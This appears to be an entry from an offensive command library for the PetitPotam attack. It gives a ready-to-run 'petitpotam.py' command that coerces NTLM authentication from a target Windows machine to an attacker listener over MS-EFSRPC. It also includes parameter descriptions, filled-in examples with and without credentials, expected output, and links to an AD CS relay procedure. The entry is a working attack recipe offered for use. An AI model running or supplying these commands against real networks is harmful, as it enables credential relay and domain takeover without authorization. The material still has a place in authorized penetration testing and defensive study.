---
id: d4cb01f3-5403-4032-b54c-ec2d3801f9ab
name: coerce-auth-ms-esfrpc-petitpotam
type: command
executor: bash
data: python3 petitpotam.py $_DOMAIN $_USERNAME $_PASSWORD $_ATTACKER_IP $_TARGET_IP
output: null
created_at: '2023-04-06T03:56:05.989060+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - coercion
  - ntlm
  - rpc
verified: true
validated: true
---

# coerce-auth-ms-esfrpc-petitpotam

## Command

```bash
python3 petitpotam.py $_DOMAIN $_USERNAME $_PASSWORD $_ATTACKER_IP $_TARGET_IP
```

## Description

Coerces NTLM authentication from a target Windows machine to the attacker's IP using MS-EFSRPC (EfsRpcOpenFileRaw).

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DOMAIN | Target domain name | No |
| $_USERNAME | Username for auth (if needed) | No |
| $_PASSWORD | Password for auth | No |
| $_ATTACKER_IP | Attacker's listener IP | Yes |
| $_TARGET_IP | Target machine IP | Yes |

## Examples

### With Credentials

```bash
python3 petitpotam.py lab.local user Password1 10.10.10.250 10.10.10.10
```

### Without Credentials

```bash
python3 petitpotam.py '' '' '' 10.10.10.250 10.10.10.10
```

## Expected Output

[+] Sending EfsRpcOpenFileRaw coercion to 10.10.10.10
[+] Coercion completed successfully

## Related

- [[procedures/AD-CS-Relay-Attack-with-Rubeus-and-PetitPotam]]
- [[tools/PetitPotam]]
